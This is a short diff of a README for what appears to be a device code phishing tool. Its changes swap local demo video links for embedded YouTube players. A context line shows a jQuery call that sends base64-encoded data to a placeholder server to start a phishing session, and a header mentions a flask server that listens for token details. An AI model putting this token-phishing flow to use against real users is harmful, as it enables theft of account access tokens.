@@ -59,7 +59,7 @@ Other way to use is to start the flask server which will listen for token detail
 
 #### Video Demo 1 (Normal Generate Token)
 
-[![Watch the video](images/image.png)](video/generate_device_code.mp4)
+<iframe width="560" height="315" src="https://www.youtube.com/embed/D4k9ueAUklM?si=oNJo162_gMs13uaX" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
 
 
 ### Dynamic Device Code Phishing
@@ -88,7 +88,7 @@ $.get("https://<Server Name>:<port>/start_session?tok=" + base64EncodedData);
 
 #### Video Demo 2 (Dynamic Device Code Phishing)
 
-[![Watch the video](images/image.png)](video/dynamic_device_code.mp4)
+<iframe width="560" height="315" src="https://www.youtube.com/embed/6RKEAgkCnpE?si=kezWPKpQvM8JEiB4" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
 
 
 
